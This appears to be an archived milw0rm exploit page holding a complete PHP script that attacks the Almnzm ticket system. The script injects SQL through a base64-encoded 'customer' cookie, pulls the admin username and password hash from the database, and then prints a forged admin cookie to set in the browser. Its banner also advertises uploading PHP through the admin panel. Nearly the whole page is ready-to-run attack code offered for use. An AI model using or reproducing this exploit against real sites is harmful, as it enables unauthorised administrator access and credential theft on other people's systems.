<html><head><title>Almnzm (COOKIE: customer) Remote SQL Injection Vulnerability</title></head><pre>&lt;?
print_r('
                                       ||          ||   | ||
                                o_,_7 _||  . _o_7 _|| q_|_||  o_///_,
                               (  :  /    (_)    /           (      .

                                        ___________________
                                      _/QQQQQQQQQQQQQQQQQQQ\__
---Script Almnzm SQL INJECTION     __/QQQ/````````````````\QQQ\___
                                 _/QQQQQ/                  \QQQQQQ\
---&quot;Powered by Almnzm&quot;          /QQQQ/``                    ```QQQQ\
                               /QQQQ/                          \QQQQ\
---admin cookie create        |QQQQ/    By  Qabandi             \QQQQ|
---Add PhP Ext                |QQQQ|                            |QQQQ|
---Upload php in adminCP      |QQQQ|    From Kuwait, PEACE...   |QQQQ|
                              |QQQQ|                            |QQQQ|
                              |QQQQ\       iqa[a]hotmail.fr     /QQQQ|
                               \QQQQ\                      __  /QQQQ/
                                \QQQQ\                    /QQ\_QQQQ/
                                 \QQQQ\                   \QQQQQQQ/
                                  \QQQQQ\                 /QQQQQ/_
                                   ``\QQQQQ\_____________/QQQ/\QQQQ\_
                                      ``\QQQQQQQQQQQQQQQQQQQ/  `\QQQQ\
');

if ($argc&lt;3) {
print_r('
-----------------------------------------------------------------------------
Usage: php '.$argv[0].' localhost /mnzm/
-----------------------------------------------------------------------------
');
die;
}
$host = $argv[1];
$p = &quot;http://&quot;.$host.$argv[2];

 function QAB_GET($qabandi, $from){
$content = $from;
preg_match_all(&quot;/&lt;&quot;.$qabandi.&quot;&gt;([^&lt;]+)&lt;\/&quot;.$qabandi.&quot;&gt;/&quot;,
    $content,
    $out, PREG_PATTERN_ORDER);

return $out[1][0];
 }



          $packet =&quot;GET &quot;.$p.&quot;index.php?action=creatticket&amp;step=2 HTTP/1.0\r\n&quot;;
          $packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n&quot;;
          $packet.=&quot;Pragma: no-cache\r\n&quot;;
          $packet.=&quot;Cookie: customer=LTInIFVuSW9OIFNlTGVDdCAxLGNvbmNhdChDSEFSKDYwLDExOCwxMDEsMTE0LDExNSwxMDUsMTExLDExMCw2MiksVmVSc0lvTigpLENIQVIoNjAsNDcsMTE4LDEwMSwxMTQsMTE1LDEwNSwxMTEsMTEwLDYyKSksY29uY2F0KENIQVIoNjAsMTA5LDk3LDEwNSwxMDgsNjIpLGVtYWlsLENIQVIoNjAsNDcsMTA5LDk3LDEwNSwxMDgsNjIpKSw0LDUsNixjb25jYXQoQ0hBUig2MCwxMTIsOTcsMTE1LDExNSw2MikscGFTU1dvcmQsQ0hBUig2MCw0NywxMTIsOTcsMTE1LDExNSw2MikpLDgsY29uY2F0KENIQVIoNjAsMTE3LDExNSwxMDEsMTE0LDYyKSxuQU1FLENIQVIoNjAsNDcsMTE3LDExNSwxMDEsMTE0LDYyKSksMTAsMTEsMTIsMTMsMTQsMTUsMTYsMTcsMTgsMTksMjAsMjEsMjIsMjMgZlJPbSBNT0RlckFUb3JzICAvKjpxYWJhbmRpOnFhYmFuZGk=&quot;.&quot;;\r\n&quot;;
          $packet.=&quot;Connection: Close\r\n\r\n&quot;;
	$o = @fsockopen($host, 80);
	if(!$o){
		echo &quot;\n[x] No response...\n&quot;;
		die;
	}
	
	fputs($o, $packet);
	while (!feof($o)) $data .= fread($o, 1024);
	fclose($o);
	
	$_404 = strstr( $data, &quot;HTTP/1.1 404 Not Found&quot; );
	if ( !empty($_404) ){
		echo &quot;\n[x] 404 Not Found... Make sure of path. \n&quot;;
		die;
	}
	
echo &quot;\n\n---Qabandi Is Here-------------------------------------------\n\n&quot;;

$Q_ver = QAB_GET(&quot;version&quot;, $data);
$Q_usr = QAB_GET(&quot;user&quot;, $data);
$Q_pwd = QAB_GET(&quot;pass&quot;, $data);


echo &quot;[q]version:\n&quot;.$Q_ver.&quot;\n\n&quot;;
echo &quot;[q]Admin User:\n&quot;.$Q_usr.&quot;\n\n&quot;;
echo &quot;[q]Admin Hash:\n&quot;.$Q_pwd.&quot;\n\n&quot;;

$qookie = base64_encode(&quot;:&quot;.$Q_usr.&quot;:&quot;.$Q_pwd);

echo &quot;\n---Admin Cookie:\n&quot;;
echo &quot;\n\njavascript:document.cookie='user=&quot;.$qookie.&quot;';\n\n&quot;;
echo &quot;\n\n---Qabandi Was Here------------------------------------------\n\n&quot;;
die;
?&gt;

# milw0rm.com [2009-06-29]</pre></html>